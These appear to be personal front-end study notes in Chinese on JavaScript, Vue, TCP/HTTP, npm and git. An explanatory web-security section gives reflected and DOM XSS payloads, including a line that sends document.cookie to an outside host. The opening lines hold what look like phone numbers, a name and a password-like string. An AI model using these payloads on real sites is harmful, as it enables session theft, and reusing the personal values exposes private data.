.dwg
image/vnd.dwg
15207258212
15071257752
74729 陈旭 25607

2908006163
73620
258Wlwx77524

jay(00),范特西(01),八度空间(02),叶惠美(03),七里香(04),十一月的肖邦(05),依然范特西(06),我很忙(07),摩羯座(08),跨时代(10),惊叹号(11),十二星座(12),哎哟不错哦(14),床边故事(16)!
10.130.133.27 17


常见的行内块元素 img input 可以设置宽高  行内和行内块元素之间会有间隔!解决方法如下!
1.将所有的行内块元素直接设置浮动，个人认为最直接的方法，当然是在适当的场景中，因为过度的浮动会产生需要清除浮动的必要（自己也总结常用的清除浮动的方法，有兴趣可以喵喵看看，大神越过）。
2.在产生边距的行内块的父元素设置属性：font-size：0px;
3.在父元素上设置，word-spacing(词边距)的值设为合适的负值即可
4.在html中将行内块元素在同一行显示，不要进行美观缩进或者换行

a标签伪类记住love hate原则顺序即为link visited hover active

由于mouseenter不支持事件冒泡，导致在一个元素的子元素上进入或离开的时候会触发其mouseover和mouseout事件，但是却不会触发mouseenter和mouseleave事件


function move({x = 0, y = 0} = {}) {
  return [x, y];
}
相当于{x=0,y=0} = 你传进来的对象
move({x: 3, y: 8}); // [3, 8]
move({x: 3}); // [3, 0]
move({}); // [0, 0]
move(); // [0, 0]
上面代码中，函数move的参数是一个对象，通过对这个对象进行解构，得到变量x和y的值。如果解构失败，x和y等于默认值。

注意，下面的写法会得到不一样的结果。

function move({x, y} = { x: 0, y: 0 }) {
  return [x, y];
}
相当于{x,y} = 你传进来的对象

move({x: 3, y: 8}); // [3, 8]
move({x: 3}); // [3, undefined]
move({}); // [undefined, undefined]
move(); // [0, 0]

第一种相当于{x = 0, y = 0}={x: 3, y: 8},如果什么都没有传则相当于{x = 0, y = 0} = {}

第二种相当于{x, y} = {x: 3, y: 8},如果什么都没有传则是为{ x: 0, y: 0 }
{x, y} = { x: 0, y: 0 }


对象里面的属性不管你是否加引号,他的值都是字符串类型,即使是数字也会转成字符串类型,对于通过[]方法来获得属性值,[]里面的值必须是字符串类型,传入数字会自动转为字符串类型.而通过.属性获得属性的值,.后面跟的必须是复合变量命名法则的值,像数字开头的值就不能访问,并且后面跟的值是不需要加引号的!!!!


var tmp = new Date();

function f() {
  console.log(tmp);
  if (false) {
    var tmp = 'hello world';
  }
}

f(); // undefined

相当于 :
var tmp = new Date();

function f() {
  var tmp;
  console.log(tmp);
  if (false) {
    tmp = 'hello world';
  }
}

f(); 所以肯定输出undefined啊!


浅拷贝是指只复制一层对象，当对象的属性是引用类型时，实质复制的是其引用，当引用指向的值改变时也会跟着变化,当对象是值类型的时候就直接复制值了
var obj = { a:1, arr: [2,3] };
var shallowObj = shallowCopy(obj);

function shallowCopy(src) {
  var dst = {};
  for (var prop in src) {
    if (src.hasOwnProperty(prop)) {
      dst[prop] = src[prop];
    }
  }
  return dst;
}

//当一个对象属性的引用值改变时将导致另一个也改变
shallowObj.arr[1] = 5;
obj.arr[1]   // = 5

function* gen(x){
  var y = yield x + 2;
  return y;
}

yield x+2 执行之后的并没有返回结果 而y接收的是返回结果所以是undefined,但是如果g.next()再g.next(2)就让上一步的返回结果变为2,所以var y = 2;然后return y 就是{value:2,done:true};

function* gen(x){
  
  var result = yield x+2;
  console.log(result);
}

var test = gen(2);


每次调用next方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个yield表达式（或return语句）为止。上面这个例子第一次执行 yield x+2;执行完结束等待第二次next移动,第二次执行没有找到yield 也没有找到return 所以直接结束(这里如果有return done的值也是为true)

class Sleep {
  constructor(timeout) {
    this.timeout = timeout;
  }
  then(resolve, reject) {
    const startTime = Date.now();
    setTimeout(
      () => resolve(Date.now() - startTime),
      this.timeout
    );
  }
}

(async () => {
  const sleepTime = await new Sleep(1000);
  console.log(sleepTime);
})();

await 后面如果是promise对象就返回promise对象的结果,如果不是就返回对应的值,上面例子中,虽然new Sleep()返回的是一个Sleep实例对象但是Sleep里面定义了then方法,所以会把其当成Promise对象来处理,所以sleeptime会返回对象的结果,而该对象的结果就是resolve函数之行之后的返回值,而resolve在setTimeout里面才会执行,故会等待1000ms,执行resolve函数,并将Date.now()-startTime的值返回出去!就被sleepTime接收到!

function sleep(interval) {
  return new Promise(resolve => {
    setTimeout(resolve, interval);
  })
}

// 用法
async function one2FiveInAsync() {
  for(let i = 1; i <= 5; i++) {
    console.log(i);
    await sleep(1000);
  }
}

one2FiveInAsync();

为什么不能在await后面直接写setTimeout来实现睡眠?
答:await后面只有是一个promise对象才会得到对象的结果,写setTimeout()不是promise对象所以直接就返回了这个函数的值也就是相当于var x = setTimeout(...);x得到的是一个正整数值,而通过上面例子那种写法,通过一个函数来返回一个promise对象,再在对象里面执行setTimeout函数,然后setTimeout函数里面通过执行resolve函数来将其变为resolved状态得到结果(promise构造函数接收一个参数为函数,这个函数里面有两个参数,这两个参数都是函数,一个是resolve,一个是reject)即new Promise(function(resolve,reject){})

var foo = 1;
console.log(foo);
function foo(){
  console.log("foo");
};
这次打印结果就是“1”；

分解
var foo; // 如果如果变量名称跟已经声明的形式参数或函数相同，则变量声明不会干扰已经存在的这类属性
foo = 1;// 代码执行。PS: 如果没有这行，打印结果是 function foo(){console.log('foo')};
console.log(foo); // 1
function foo(){
  console.log("foo");
};

函数声明优先级比变量声明高!

function f(...test){
         let sum = 0;
         for(let i=0;i<test.length;i++){
             sum+=test[i]
         }
         return sum;
}
f(1,2,3,4,5,6)  rest 参数就是将传入的参数变为数组,test直接就是一个数组了

而拓展运算符可以理解为将传入的数组变为参数例如可以这样
 var arr = [1,2,3,4,5,6]
 f(...arr);这个等于上面的f(1,2,3,4,5,6)然后rest运算符又将传入的参数变成了一个数组,所以说拓展运算符相当于 rest的逆运算!

事件经过:

window 往事件触发处传播，遇到注册的捕获事件会触发
传播到事件触发处时触发注册的事件
从事件触发处往 window 传播，遇到注册的冒泡事件会触发

但是需要注意的是如果body里面的直接子节点同时注册冒泡和捕获,然后点击该节点那么事件触发按注册顺序执行

e.stopPropagation()阻止向上冒泡
e.stopImmediatePropagation()后面事件都不再触发

事件有三个阶段,addEventListener第三个参数可以决定想要在那个事件阶段触发事件,第一阶段是捕获然后目标再然后是冒泡,默认为false也就是在冒泡阶段触发事件
事件捕获由外向里,事件冒泡由里向外,如果同一个目标同时注册冒泡和捕获,那么事件触发的顺序按照注册顺序来进行,事件捕获优先于事件冒泡也就是先捕获再冒泡 假设三个dom元素child parent body
假设三个都注册了冒泡但是parent还注册了捕获阶段的事件,那么在你点child的时候parent就捕获到了,如果body也有捕获那么最开始就是parent捕获,然后按冒泡来,child->parent->body

背景图宽的百分比得到的偏移量是(容器的宽度-背景图的宽度)/百分比值!
例如一个盒子宽1000 高600 你设置背景图大小为宽800 高200
然后background: url() no-repeat 25% 25%;其实就相当于
background: url() no-repeat 50px 100px; 所以当偏移量为100%的时候其实就相当于往容器右对齐了!

<div id="app">
    <div id="counter-event-example">
      <p>{{ total }}</p>
      <button-counter v-on:increment="incrementTotal"></button-counter>
      <button-counter v-on:increment="incrementTotal"></button-counter>
    </div>
</div>
 
<script>
Vue.component('button-counter', {
  template: '<button v-on:click="incrementHandler">{{ counter }}</button>',
  data: function () {
    return {
      counter: 0
    }
  },
  methods: {
    incrementHandler: function () {
      this.counter += 1
      this.$emit('increment')
    }
  },
})
new Vue({
  el: '#counter-event-example',
  data: {
    total: 0
  },
  methods: {
    incrementTotal: function () {
      this.total += 1
    }
  }
})
</script>
//子组件通过$emit来触发事件,父组件在子组件里面通过写v-on:事件名="函数名"来监听事件$emit('increment')只要点击按钮,就会触发事件,外面监听到了就会去执行监听事件中的函数,要在一个Vue里面才行,所以这里是不能写在自定义组件的外面的!

./和不写是没有区别的都是相对路径
images
   1.png
index.html
index里面引用这个图片可以直接写images/1.png也可以写./images/1.png  ./相当于找到当前文件的上级目录也可以不写直接引用

1.png引用外面index.html 要写 ../index.html

只写一个/表示根目录 是用作绝对路径 

var timer1 = (cb,time)=>{(function loop(){setTimeout(loop,time);cb();})();}
var timer2 = (cb,time)=>{(function loop(){cb();setTimeout(loop,time);})();}

上面两个函数的区别在于,第一个定时器永远都会执行,进入循环事件,而第二个如果cb()报错了,那么后面的定时器就不会执行了

    ctx.beginPath();
    ctx.arc(75,75,50,0,Math.PI*2,true); // 绘制
    ctx.moveTo(110,75);
    ctx.arc(75,75,35,0,Math.PI,false);   // 口(顺时针)
    ctx.moveTo(65,65);
    ctx.arc(60,65,5,0,Math.PI*2,true);  // 左眼
    ctx.moveTo(95,65);
    ctx.arc(90,65,5,0,Math.PI*2,true);  // 右眼
    ctx.stroke();
    moveTo()表示从哪里开始画,如果你不设置的话那么就会出现一条画笔从上个终点到这个起点经过的痕迹

function test(person) {
  person.age = 26
  person = {
    name: 'yyy',
    age: 30
  }

  return person
}
const p1 = {
  name: 'yck',
  age: 25
}
const p2 = test(p1)
console.log(p1) 
console.log(p2)
在函数里面相当于person = p1,而p1是个对象,所以赋值给person的是个指针,你可以理解为一把钥匙,当person有钥匙之后就可以访问p1里面属性的值也可以进行修改,但是如果将另一个对象赋值给person,那么这时候person手上的钥匙就变了(每个人只能有一个钥匙)  

parseInt(string, radix)函数

string 是必须的，要被解析的字符串。
radix 可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。也就是按什么进制来解析

用法

如果省略该参数或其值为 0，则数字将以 10 为基础来解析。

xss (cross-site-script)反射攻击常见的是利用输入框或者表单在里面输入一段js代码,导致客户端去执行这一段代码.最常见的就是给用户发一个链接,利用url参数来进行攻击http://www.zcool.com.cn/tosearch.do?page=0&world=%3Cscript%20src=%22http://saintcoder.duapp.com/joke/joke.js%22%3E%3C/script%3E 这段链接是去站酷网站的搜索页面,然后关键词是一个script标签,指向的是黑客想要运行的一段js代码,客户端会直接执行这个脚本,然后可能这个脚本直接创建一个没有宽高的img标签,并且将src指向黑客的脚本文件,在创建img的时候就把cookie给发到黑客手上去了例如下面:img.src ='http://saintcoder.duapp.com/joke/joke.php?joke='+encodeURIComponent(document.cookie);
为什么这里不会有同源策略???凭什么能够把A网站的cookie信息传导黑客手上?参考jsonp,src这个属性是不受同源策略限制的!!!请求图片的时候已经把cookie发过去了
这样在黑客哪里就可以获取到用户的cookie信息了


还有一种XSS DOM攻击
前提是易受攻击的网站有一个HTML页面采用不安全的方式从document.location 或document.URL 或 document.referrer获取数据（或者任何其他攻击者可以修改的对象）。

 <HTML>
 2 <TITLE>Welcome!</TITLE>
 3 Hi
 4 <SCRIPT>
 5 var pos=document.URL.indexOf("name=")+5;
 6 document.write(document.URL.substring(pos,document.URL.length));
 7 </SCRIPT>
 8 <BR>
 9 Welcome to our system
10 …
11 </HTML>
请求下面这个网址
http://www.vulnerable.site/welcome.html?name=<script>alert(document.cookie)</script>
那么script标签就被写入到文档里面去了
解决方法:
HttpOnly 防止劫取 Cookie,用户的输入检查(转义),服务端的输出检查,还有设置csp(content-security-policy)比如通过设置http-header只允许加载本站资源还可以设置只允许加载https协议图片等等还可以设置meta标签

CSRF 跨站请求伪造
get请求
跨站请求伪造一般是在用户不知情的情况下让用户对服务器发起了请求,假如用户以登录的状态现在正在某新闻网站浏览,并且在一条新闻下面评论,每条评论后面有一个删除按钮,用户可以删掉自己的评论,这个时候其他地方弹出来一个图片而用户点击了,这个图片的src属性正好是"http://www.c.com:8002/content/delete/87343",那么id为87343这条评论就会删除这是get请求!

而如果是post请求,其实也可以让用户上当
同样假设有一个用户正在以登录的状态浏览某银行网站 www.bank.com,该银行转账的页面是www.bank.com/transfer.php, 该页面有两个输入框分别是名字和密码还有一个提交按钮,这时候有一个网页链接发过来了,该用户打开了该网页,然而这个网页里面也有两个输入框和一个button按钮,并且还有一段js脚本,网页里面也有一个form表单同时方法也是post请求,里面表单转账页面表格都是一样的,值已经输入好,并且在js脚本里面让网页一打开就运行,就点击按钮提交表单,这样就可以伪造一个post请求了

解决方法:验证码 header里面的referer token  HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。

总结xss请求是利用脚本进行攻击,可以获取用户的信息,包括账号或者密码等等,而csrf则是利用用户去做黑客想做的事,这两者也可以结合,如果一个网站有token验证,但是他却存在xss漏洞,那么我们可以用xss攻击拿到页面里面的token值,然后再去发送一个合理的请求
csrf在于引导用户点击链接,链接里面有一个img src就可以以你的登录状态发起请求了.
xss反射型攻击在于利用url参数来指向一个js脚本然后客户端解析后直接进行执行了这个脚本.

点击劫持!
通过iframe引入想要攻击的网站,并将其透明度设为0,但是z-index设为2,然后网页里面有一个button按钮z-index设为1,当你去点这个button的时候其实button是在iframe下面的,其实你点了iframe页面的按钮!
self表示当前窗口,top表示顶级窗口 <body><iframe ...><body> iframe里面引入一个网站那么假如该网站有判定self==top才加载的时候,如果不相等就会被拦截.self就是ifram自己

注意:请求不需要连接才可以发,但是数据必须要连接成功才可以发!

为什么 TCP 建立连接需要三次握手，明明两次就可以建立起连接?
答: c 客户端 s 服务端  第一次握手s可以知道自己能接收(c能发送) ,第二次握手c就知道自己接受发送都是对的(s能发送),但是s此时不知道自己发送是否成功,这时候如果c再发送一次,s收到那么就知道自己接收发送都是成功的就可以建立连接了!



而如果是两次连接,假设存在下面一个情况,会出现什么情况?
起初，两端都为 CLOSED 状态。在通信开始前，双方都会创建 TCB。 服务器创建完 TCB 后便进入 LISTEN 状态，此时开始等待客户端发送数据.客户端发送了一个请求A,但是因为网络延迟的原因暂时没到达服务端,TCP此时就会启动超时重传发送一个请求B,B成功发送,服务端接收请求告诉客户端已收到并直接将状态变为established,客户端收到服务器发的应答也将状态变为established,此时连接成功.然后过了一会之后,两个都关闭连接.但是这时候请求A到达了服务端,服务端接收成功并返回一个响应给客户端同时将状态变为established,但是此时客户端处于close状态,根本收不到这个应答,会造成服务端一直等待,从而资源浪费!

TCP断开四次连接
1.客户端认为数据已经发送完成,向服务端发送断开请求!
2.服务端向客户端发送请求并表示自己这边可能还有数据要传!并释放了客户端到服务端的连接,也就是服务端不再接受客户端的数据!(请求是请求,数据是数据,三次握手成功,才能建立连接,连接成功,才能发送数据!)
3.服务端再次向客户端发送请求表示自己数据已经发送完毕,客户端可以断开连接了!
4.客户端收到服务端断开请求,并再次向服务端发送确认断开,自己同时进入Time-wait状态,在2MSL内如果没有收到服务端的再次请求,客户端释放连接进入close状态!服务端收到请求,也进入关闭状态!

为什么客户端要进入TIME-WAIT状态，等待2MSL时间后才进入CLOSED状态？

这是为了保证服务端能收到客户端的确认应答。若客户端发完确认应答后直接进入CLOSED状态，如果确认应答因为网络问题一直没有到达，那么就会造成服务端不能正常关闭(服务端只有收到了应答才会closed)假设在2msl里面服务端没有收到客户端报文,就会重发之前的请求,这时候客户端便会回到之前的第四次握手,直到2msl没有收到请求才进入closed状态!

ref需要在dom渲染完成后才会有,所以this.$refs.resetFields()要放在this.$nextTick()中使用,或者在mounted()钩子中使用ref,v-for里面的ref得到的是一个数组

javascript中的每一个函数都有一个指向某一个对象的prototype属性，该函数当被函数new操作符调用时会创建并返回一个对象，并且该对象中会有一个指向其原型对象的秘密链接，通过该链接（有些环境下被称之为__proto__），可以在新建对象上调用相关原型对象的方法和属性
而原型对象自身也具有对象固有的普遍特征，因此本身也包含了指向其原型的链接。由此就形成了一条链，我们称之为原型链。

在构造函数里面调用Parent.call(this,值)可以直接继承父亲的属性,继承父类的方法则是将原型对象改为一个父类的实例对象

为什么是Child.prototype = new Parent()而不是为Parent.prototype,因为如果是后者当你想添加自己的Child.prototype.func方法时会加到Parent.prototype上面去,如果父类刚好也有这个方法,甚至会将其覆盖,当父类调用哪个方法时,方法已经变了,会出问题.但是这样也会有一个问题就是因为是new Parent的所以_proto_下面会多出了不需要的父亲的属性,造成内存浪费

箭头函数体如果有多个表达式就需要用{}包裹起来,并且需要写return;如果返回一个对象就需要()包起来,还有一种写法是可以用括号括起来,然后再用逗号将表达式隔开,最后一个表达式就是返回的结果,例如let f = (x,y) => (x++,y++,x*y) ,f(1,2) = 6

如果是 ToPrimitive(obj, Number)，处理步骤如下：

如果 obj 为 基本类型，直接返回
否则，调用 valueOf 方法，如果返回一个原始值，则 JavaScript 将其返回。
否则，调用 toString 方法，如果返回一个原始值，则 JavaScript 将其返回。
否则，JavaScript 抛出一个类型错误异常。

如果是 ToPrimitive(obj, String)，处理步骤如下：

如果 obj为 基本类型，直接返回
否则，调用 toString 方法，如果返回一个原始值，则 JavaScript 将其返回。
否则，调用 valueOf 方法，如果返回一个原始值，则 JavaScript 将其返回。
否则，JavaScript 抛出一个类型错误异常。

由于undefined转换成数字为NaN，所以将Number,String,Boolean这三种类型与undefined比较时，总是返回false 而对于null，JS则将其当成对象来比较，即尝试调用null的valueOf与toString方法，再将返回的结果与另一个值进行比较,可以推断null==false返回false的原因是因为null的valueOf实现导致的,由于null没有valueOf与toString方法，因此始终返回false. 但是要注意的是null == undefined为true

所以总结知道
undefined被当成基本类型，undefined转换成数字是NaN，因此undefined与除null之外的其它类型值进行比较时始终返回false(注意NaN==NaN返回false) 
null被当成复合对象，由于null没有valueOf与toString方法，因此和除了undefined之外的其它类型值进行比较时始终返回false 

'a'++'b'是'aNaN' 这里+'b'就表示Number('b')所以你懂的就是NaN 'a'+NaN就是'aNaN'

==判断同种类型不需转换,不同类型需要转为字符串或者数值来进行比较[] == '0'就是false 会变为
'' == '0' 而 [] == 0 为true 会变为 0 == 0

那为什么null == undefined 这个是规定,没有为什么... Number(null)为0 Number(undefined)为NaN, NaN == NaN 是false
true == 'true' 结果是false 因为会变为 1 == 'true' 就是 1 == NaN,作 == 判断时,如果一方有数值那么就会把另外一方也转为数值, true为1,false为0.
对于加法来说 1 + [] [].valueOf()还是[] ,所以就用toString得到'', 1+ ''就是'1',而对于减法来说1 - [], [].valueOf()还是[] ,所以就用toString得到'', 1 - '', ''变为number所以就是1 -0还是1

一般对象的valueOf的值就是本身,toString是[Object,Object],数组的toString是[1,2,3]变为'1,2,3'
{}的值为[Object,Object]变数值为NaN,空数组的值转为数字为0,有一个且为数值的为当前数值,其他都是NaN,所以[]==![]为true,{}==!{}为false,要注意[]==[]就是false,同种类型不需要转换,[]是有一个地址的值的,![]自然就是false ,变为0,[]变为''再变为0所以为true,而对象最后是NaN==0所以是false,'a'变为数字也是NaN

null与undefined在与其他数相等运算时不进行类型转换，
null与undefine单独与别的值比较都为false,但undefined为null的衍生对象，所以两个比较为true

0==null false 
false == null false

数字与字符串相加结果是字符串
数字字符串与数字相减  数字字符串会变成数字，结果就是数值了
非数值字符串与数字相减 结果是NaN
与数字相加减true转化为1，false转化为0
与字符串相加减布尔值转化为字符串

因为不带key时节点能够复用，省去了销毁/创建组件的开销，同时只需要修改DOM文本内容而不是移除/添加节点，这就是文档中所说的“刻意依赖默认行为以获取性能上的提升”。

既然如此，为什么还要建议带key呢？因为这种模式只适用于渲染简单的无状态组件。对于大多数场景来说，列表组件都有自己的状态。

举个例子：一个新闻列表，可点击列表项来将其标记为"已访问"，可通过tab切换“娱乐新闻”或是“社会新闻”。

不带key属性的情况下，在“娱乐新闻”下选中第二项然后切换到“社会新闻”，"社会新闻"里的第二项也会是被选中的状态，因为这里复用了组件，保留了之前的状态。要解决这个问题，可以为列表项带上新闻id作为唯一key，那么每次渲染列表时都会完全替换所有组件，使其拥有正确状态。

这只是个简单的例子，实际应用会更复杂。带上唯一key虽然会增加开销，但是对于用户来说基本感受不到差距，而且能保证组件状态正确，这应该就是为什么推荐使用唯一id作为key的原因。至于具体怎么使用，就要根据实际情况来选择了。

字符串里面的slice和substring方法的主要区别在于,slice里面如果传了负数,则会把负数去加上这个字符串的长度变成新的参数,而substring,如果传入负数会变成0(包括NaN),同时substring中如果第一个参数比第二个参数大,则会自动换位置,substring(0,3)和substring(3,0)结果是一样的,但是slice(3,0)则是会直接返回空字符串,slice(-1,-2)也是一样,它等于slice(length-1,length-2),前面比后面大返回空字符串''

computed多个影响一个,走缓存,computed 一个sumScore,return this.math+this.english.数学和英语变化都会改变sumScore的值
watch监听一个值,可以一个影响多个,比如监听数学成绩是否变化,如果变化,那么总分跟着变化,还可以改变其他的值,并且有两个参数一个是新的值一个是旧的值.

for...in遍历一个对象,遍历的是键(key),for...of遍历一个数组或者map,set必须要有iterable迭代器的对象.遍历的是值(value)
而vue里面的v-for 如果遍历数组是(item,index) in array ,
遍历对象则是(value,key,index) in object

routes是new VueRouter传入一个对象里面的一个属性,routes是一个数组,数组的成员是对象,对象里面有path和component属性.
$router是用来控制路由的,可以控制路由的跳转有go,push,replace方法
$route则是可以获取传入路由的请求参数例如<router-link :to="'/news/sport/detail/' + sport.id">,那么我可以this.$route.params.id来获取,id怎么来的,这个是路由里面的path来设置的
path: '/news/sport/detail/:id',此处冒号就表示是动态路径,通过:id传输,用前面$route接收,但是是字符串.routerlink里面就相当于给:id赋值了

push和replace的区别就是push相当于往原来的栈里面压栈,而replace则是重新创了一个栈,一个可以通过返回回到上一步一个不行,而且这两个是不同的栈,如果push里面有内容,你点击返回还是可以返回的,但是后者则不行,back和go(-1)是一样的

-S就是–save的简写。dependencies是什么呢？ 生产环境。
-D就是–save-dev的简写。 devdependencies是什么呢？ 开发环境。


package.json 文件只能锁定大版本，也就是版本号的第一位，并不能锁定后面的小版本，`npm install` 都是拉取的该大版本下的最新的版本，为了稳定性考虑我们几乎是不敢随意升级依赖包的，这将导致多出来很多工作量，测试/适配等，所以 package-lock.json 文件出来了，当你每次安装一个依赖的时候就锁定在你安装的这个版本。
在以前可能就是直接改 package.json 里面的版本，然后再 `npm install` 了，但是 5 版本后就不支持这样做了，因为版本已经锁定在 package-lock.json 里了，所以我们只能 `npm install xxx@x.x.x` 这样去更新我们的依赖，然后 package-lock.json 也能随之更新。

那如果我们安装时的包有bug，后面需要更新怎么办？
在以前可能就是直接改 package.json 里面的版本，然后再 `npm install` 了，但是 5 版本后就不支持这样做了，因为版本已经锁定在 package-lock.json 里了，所以我们只能 `npm install xxx@x.x.x` 这样去更新我们的依赖，然后 package-lock.json 也能随之更新。

这个就是main.js内容,而App.vue就是相当于是整个页面了
new Vue({
el: '#app',
//Vue根实例中有template选项引用了组件后，然后会把template中的渲染结果替换掉 #app 标识的元素。
template: '<app></app>',
components: {
App //等价于 App: App
}
})也可以写成下面
new Vue({
el: '#app',
//Vue根实例中有template选项引用了组件后，然后会把template中的渲染结果替换掉 #app 标识的元素。
render : h=> h(App)
}
})

当注册组件 (或者 prop) 时，可以使用 kebab-case (短横线分隔命名)、camelCase (驼峰式命名) 或 PascalCase (单词首字母大写命名)。
PascalCase 是最通用的声明约定而 kebab-case 是最通用的使用约定。

components: {AppLeaf,MyComponent} 使用就是<app-leaf></app-leaf>和<my-component></my-component>

模块热替换(hot module replacement 或 HMR)是 webpack 提供的最有用的功能之一。模块热替换无需完全刷新页面，局部无刷新的情况下就可以更新。例如修改某个vue组件可以不刷新进行更新,但是对js做出改动是不会自动更新的,必须重新打包.比如修改main.js


slice是切的意思,splice是粘接的意思,slice不会改变原数组,而后者会
slice(start,end) 返回包含start但不包含end的数组,不传end则直接到末尾(包含最后一个元素)
splice(start,count,元素)返回被删掉的元素数组,count是要删掉的个数,然后从start哪里开始插入后面添加的元素.如果元素是一个数组可以用拓展运算符展开添加.


JavaScript和CSS对DOM构建的影响


解析过程中遇到了script标签时，HTML解析器暂停工作，JavaScript引擎介入，执行脚本，此时只能访问位于script之上已经构建了的DOM。访问后面的元素会返回null，执行操作会报错。脚本执行完，HTML解析器恢复解析。
如果不是内嵌脚本，而是通过src加载的脚本（有src属性的脚本会忽略标签内的代码），会等待下载完成后执行，期间HTML解析器一直是暂停的状态。不过好在Chrome浏览器的预解析操作会在渲染引擎收到字节流之后开启一个预解析线程分析HTML文件中包含的JavaScript、CSS等相关文件然后提前下载这些文件。


在有src属性加载脚本的script标签中添加async属性表明这个脚本是异步的，在后台加载，HTML解析器继续工作，等脚本加载完成后立即打断HTML解析器（如果还没解析完的话）开始执行脚本。
添加defer属性也会异步加载，但是会等到HTML解析完毕，在DOMContentLoaded事件之前执行。这两个属性对无src属性的脚本不会生效。


对于CSS，由于不直接参与DOM构建，本来是不会阻塞DOM树的构建的。但是如果页面有同步执行的脚本时，因为执行前是不知道脚本有没有操作CSSOM的，因此渲染引擎为了避免脚本执行出错的可能性，直接假定脚本会依赖CSSOM。于是下载CSS文件并解析成CSSOM，再执行脚本。期间HTML解析器一直是暂停的状态，直到脚本执行完毕才继续工作。



页面有异步脚本时，会继续构建DOM树，脚本执行前需要等待CSS。是否继续渲染则需要看CSS是否就绪，如果CSS还在加载中则需要等待。

如果是defer脚本，CSS加载完就开始渲染，只是DOMContentLoaded和load事件会延迟触发；
如果是async脚本，DOMContentLoaded正常触发，CSS加载完就开始渲染，load事件会等待脚本执行完再触发
总之CSS阻塞DOM树的构建与否取决于脚本执行的时机。

加载渲染过程
父beforeCreate->父created->父beforeMount->子beforeCreate->子created->子beforeMount->子mounted->父mounted
子组件更新过程
父beforeUpdate->子beforeUpdate->子updated->父updated
父组件更新过程
父beforeUpdate->父updated
销毁过程
父beforeDestroy->子beforeDestroy->子destroyed->父destroyed

rotateX向上转是正 rotateY向右转是正

HTTP1.1 如果要同时发起多个请求，就得建立多个 TCP 连接，因为一个 TCP 连接同时只能处理一个 HTTP1.1 的请求。
(注意: 在1.1里面可以多个请求共用一个tcp连接,但是是有请求顺序的,如果某个请求花费时间较长会造成对头阻塞.如果想同时发起多个请求,就需要建立多个TCP连接,可是客户端有同一域名下的请求有最大并发连接限制,例如谷歌就大约是6个,可以将资源分配不同域名,这样就可以突破浏览器限制,建立更多tcp连接)而协议议规定HTTP/1.0如果想要保持长连接，需要在请求头中加上Connection: keep-alive，而HTTP/1.1默认是支持长连接的，有没有这个请求头都行。

但是http长连接会一直保持吗？肯定是不会的。一般服务端都会设置keep-alive超时时间。超过指定的时间间隔，服务端就会主动关闭连接。同时服务端还会设置一个参数叫最大请求数，比如当最大请求数是300时，只要请求次数超过300次，即使还没到超时时间，服务端也会主动关闭连接。

每发起一个 HTTP 请求，都得经历三次握手建立 TCP 连接，如果连接只用来交换少量数据，这个过程就会严重降低 HTTP 性能。所以我们可以将多个小文件合成一个大文件，从而减少 HTTP 请求次数。

其实由于持久连接（重用 TCP 连接，以消除连接及关闭时延；HTTP/1.1 默认开启持久连接）的存在，每个新请求不一定都需要建立一个新的 TCP 连接。但是，浏览器处理完一个 HTTP 请求才能发起下一个，所以在 TCP 连接数没达到浏览器规定的上限时，还是会建立新的 TCP 连接。从这点来看，减少 HTTP 请求仍然是有必要的。(假如我现在有七个连接请求,前面六个同时发送,那么就会创建六个tcp连接,第七个就会重用其中一个TCP进行等待)

在 HTTP2 上，多个请求可以共用一个 TCP 连接，这称为多路复用。同一个请求和响应用一个流来表示，并有唯一的流 ID 来标识。
多个请求和响应在 TCP 连接中可以乱序发送，到达目的地后再通过流 ID 重新组建。




TersePlugin,BundleAnalyZerPlugin

当你当前分支有修改的文件modified还没有add或者你add了还有commit那么你是无法做到切换分支的,而如果你只是新建了一个文件(并且没有其他的修该过的文件),那么不会影响你却切换分支!

当你git stash操作的时候,无论你当前分支下的文件此时有没有进行add操作,在你修复bug后切回当前分支的时候都会是在暂存区还没有add的状态,你需要再次进行add再commit,并且在你stash之后查看内容是你没修改之前的内容,只有当你git stash pop(apply)才会显示你修改之后的内容!

而对于一个你新建的文件(即没有被tracked的文件)是无法做保存的,stash操作显示没有可以保存的,并且当你切换到另外一个分支的时候,这个新建的文件会出现在这个分支下面,而如果你在这个分支下面做add操作,那个此时这个文件就会属于你这个分支下面了,当你切回之前的分支,已经不会再显示当前这个新建的文件了

当你对一个新建的文件进行了add还有commit操作然后再保存,那么你stash之后这个文件会消失,等你切回来这个分支,并且pop出来的时候,文件会显示正常并且此时文件位于暂存区也就是处在add之后的状态,你只需要commit就行

对于切换,如果你只是新建一个文件并且没有add那么随便切换哪个分支都没事,如果你新建一个文件并且add了,那么你只能切换到和你一样的commit内容的分支,不能切换到跟你不一样的分支,举个例子,我现在在master上面新建一个分支xiaodu,那么xiaodu的内容和master是一样的,然后我新建一个文件并且add了,那么我此时切换到master下面,我git status会发现有一个在缓存区的新文件,此时如果我commit会发现直接成功,再切换到xiaodux下面,那么下面没有这个新建的文件了,这里建议去用指针理解比较好理解!(master和xiaodux指向同一个地方,然后呢,你再xiaodux里面进行add只是放在stage区,并不在自己的工作区也就是没有往前面走一步,那么我master里面直接提交相当于直接往前走了一步的)

假如我们在master上面有个bug,我正在dev上面开发,我这个时候就先把手上正在修改的内容进行stash处理,然后切到master,再在master上新建一个分支就叫fixbug吧,我们在fixbug上面修复好了bug,切回master,让master合并fixbug然后删掉fixbug分支.因为我们dev也是从master上面建的,那么dev上面有可能也有这个bug,然后我们就切回dev,这时候还记得我们刚才的stash吗,我建议先不要pop出来,因为假如你修复的bug文件,和你刚才保存的文件是同个文件,那么这时候就可能有冲突,你去cherry-pick的时候就会报错.操作无法进行,建议先cherry-pick 然后再去pop出来,这样虽然里面内容有冲突,但是你可以进行修改不会报错!当然要是没有相同的文件,那么自然而然顺序就无所谓了

对于git branch -d操作如果你在master上面新建的分支里面新建了一个内容但是还没有commit,那么你是可以随意在master上删掉这个分支的,而如果你创建了并且commit了(无论内容是否为空),那么你去-d的时候会提醒你还没有合并无法删除,此时可以用-D来进行删除


git push origin <branch>来推送分支,此时虽然分支已经在远程仓库了,但是你并没有与其建立联系,你进行pull操作并不能将其内容拉下来!此时就需要与远程分支建立连接
但是你也可以进行push的时候直接建立连接,那就是git push --set-upstream origin <branch>
git branch --set-upstream-to=origin/<branch> newdev 将本地分支与远程分支建立连接

要想在本地创建与远程分支一样的分支该怎么做?(创建的时候其实也会直接与远程分支进行连接了)
